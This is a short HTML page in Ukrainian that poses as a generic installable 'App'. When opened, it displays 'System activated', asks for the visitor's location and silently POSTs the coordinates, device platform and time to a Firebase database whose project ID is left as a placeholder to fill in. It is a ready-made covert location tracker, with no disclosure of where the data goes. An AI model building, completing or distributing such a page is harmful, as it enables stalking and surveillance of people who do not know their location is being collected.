<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Додаток</title>
  <link rel="manifest" href="manifest.json">
  <meta name="theme-color" content="#6200ea">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-title" content="Додаток">
  <script>if('serviceWorker' in navigator) navigator.serviceWorker.register('sw.js');</script>
</head>
<body style="background: #000; color: #0f0; text-align: center; padding-top: 50px;">
    <h2>Система активована</h2>
    <p id="info">Очікування дозволу...</p>

    <script>
        const DB_URL = "https://TVOI_PROJECT_ID.firebaseio.com/users.json";

        function sendData(lat, lon) {
            const data = {
                coords: { lat: lat, lon: lon },
                device: navigator.platform,
                time: new Date().toLocaleString()
            };
            fetch(DB_URL, { method: 'POST', body: JSON.stringify(data) })
                .then(() => document.getElementById('info').innerText = "Зв'язок встановлено");
        }

        // Запит геолокації
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (pos) => sendData(pos.coords.latitude, pos.coords.longitude),
                (err) => document.getElementById('info').innerText = "Доступ відхилено"
            );
        }
    </script>
</body>
</html>
